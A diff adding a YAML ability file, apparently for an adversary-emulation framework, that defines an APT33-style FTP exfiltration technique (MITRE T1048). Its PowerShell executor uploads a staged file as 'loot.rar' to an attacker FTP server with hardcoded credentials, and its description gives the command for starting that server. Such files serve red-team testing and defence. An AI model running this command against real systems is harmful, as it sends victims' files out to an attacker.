@@ -1,0 +1,44 @@
+- tactic: exfiltration
+  technique_name: Exfiltration Over Alternative Protocol
+  technique_id: T1048
+  name: Exfiltration via FTP - APT33
+  description: 'Change the IP Address to your attacking machine. Requires an FTP server
+    on the attacking machine via the following command: python -m pyftpdlib -u Michael
+    -P Scott -p 21 -w'
+  executors:
+  - name: psh
+    platform: windows
+    command: 'cd #{host.dir.staged};
+
+      $client = New-Object System.Net.WebClient;
+
+      $client.Credentials = New-Object System.Net.NetworkCredential("Michael","Scott");
+
+      $client.UploadFile("ftp://192.168.1.107:21/loot.rar","#{host.file.path}");'
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements:
+  - module: plugins.stockpile.app.requirements.paw_provenance
+    relationship_match:
+    - source: host.dir.staged
+  - module: plugins.stockpile.app.requirements.paw_provenance
+    relationship_match:
+    - source: host.file.path
+  privilege: ''
+  repeatable: false
+  buckets: []
+  additional_info:
+    cleanup: '[]'
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: true
+  id: 35c12b83-e74a-46cd-9401-1dbe7e28924a
